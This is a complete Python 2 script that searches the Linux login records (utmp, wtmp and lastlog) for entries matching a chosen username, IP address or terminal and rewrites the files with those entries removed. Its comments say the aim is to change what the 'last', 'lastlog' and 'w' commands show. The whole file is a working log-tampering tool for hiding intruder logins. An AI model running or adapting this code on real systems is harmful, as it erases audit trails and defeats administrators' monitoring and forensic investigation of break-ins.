# -*- coding:utf-8 -*-

import struct
import pwd
import argparse
import sys
import os
import time


def match_log():
    '''
    open xtmp/lastlog logfile and search for record.
    return **unmatched** record.
    '''

    tamperlog = ''
    matched = []
    if FILENAME == "/var/log/lastlog":
        tmp_id = -1
        try:
            pw = pwd.getpwnam(USERNAME)
        except:
            Print(put_color("[*]not found!", "green"), level=1)
            return
    try:
        with open(FILENAME, 'rb') as fp:
            while 1:
                bytes = fp.read(SIZE)
                if not bytes:
                    break

                record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in struct.unpack(STRUCT, bytes)]
                if FILENAME != "/var/log/lastlog":
                    if all([compare(clues[0], record[4]),  # search username
                            compare(clues[1], record[5]),  # search ip
                            compare(clues[2], record[2])]):  # search ttyname
                        matched.append("  [-]"+" ".join([record[4], record[2], record[5]]))
                        continue
                else:
                    tmp_id += 1
                    if tmp_id == pw.pw_uid:
                        matched.append("  [-]"+" ".join([
                            USERNAME,
                            time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))),
                            record[2],
                        ]))
                        continue

                tamperlog += bytes

        if matched:
            Print(put_color("[*]found matched log in ", "yellow")+FILENAME, level=1)
            for i in matched:
                Print(put_color(i, "white"), level=1)
            if raw_input(put_color("\n[!]clean them?", "white")+" [y]/n > ") != "n":
                return tamperlog
            else:
                Print(put_color("  [!]aborted", "yellow"), level=1)
        else:
            Print(put_color("[*]not found!", "green"), level=1)

    except Exception as e:
        Print("%s %s %s" % (put_color("[X]match log:", "red"), FILENAME, put_color("failed", "red")), level=0)
        Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)


def tamper_log(contents):
    '''
    tamper the log files.
    '''
    try:
        with open(FILENAME, 'w+b') as fp:
            fp.write(contents)
        Print(put_color("  [-]success!", "green"), level=1)
    except Exception as e:
        Print("%s %s %s" % (put_color("[X]tamper log:", "red"), FILENAME, put_color("failed", "red")), level=0)
        Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)


def compare(a, b):
    '''
    unassigned == None == True
    '''

    return a == b or a == None


def put_color(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def Print(msg, level):
    '''
    control output
    '''

    print(msg)


if not os.geteuid() == 0:
    if raw_input(put_color("[!]you are NOT ROOT", "red")+"\n  [-]continue? y/[n] > ") != "y":
        sys.exit(put_color("\n[!]aborted", "yellow"))
    else:
        Print(put_color("  [-]as your wish\n", "yellow"), level=0)

PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

parser = argparse.ArgumentParser()
parser.add_argument('-m', '--mode', type=int, required=True,
                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')

parser.add_argument('-u', '--username', help='match records based on username')
parser.add_argument('-i', '--ip', help='match records based on ip')
parser.add_argument('-t', '--ttyname', help='match records based on ttyname')

parser.add_argument('-f', '--filename', help='match records based on filename')
parser.add_argument('-v', '--verbose', default=1, type=int,
                    choices=[0, 1, 2], help='how much information you want: 0:silent; [1]; 2:debug')

args = parser.parse_args()
MODE = args.mode

USERNAME = args.username
IP = args.ip
TTYNAME = args.ttyname

FILENAME = args.filename if args.filename else PATH[MODE]
VERBOSE = args.verbose


LASTLOG_STRUCT = 'I32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)

STRUCT = [LASTLOG_STRUCT, XTMP_STRUCT][MODE in [0, 1]]
SIZE = [LASTLOG_STRUCT_SIZE, XTMP_STRUCT_SIZE][MODE in [0, 1]]


if MODE in [0, 1]:
    clues = [USERNAME, IP, TTYNAME]
    if not any(clues):  # clues is empty!
        sys.exit(put_color("[X]give me a username or ip or ttyname", "red"))

    # 0: change command: last
    # 1: change command: lastlog
    new_data = match_log()
    if new_data != None:
        tamper_log(new_data)
else:
    # 2: change command: w
    if not USERNAME:  # clues is username!
        sys.exit(put_color("[X]give me a username", "red"))

    new_data = match_log()
    if new_data != None:
        tamper_log(new_data)
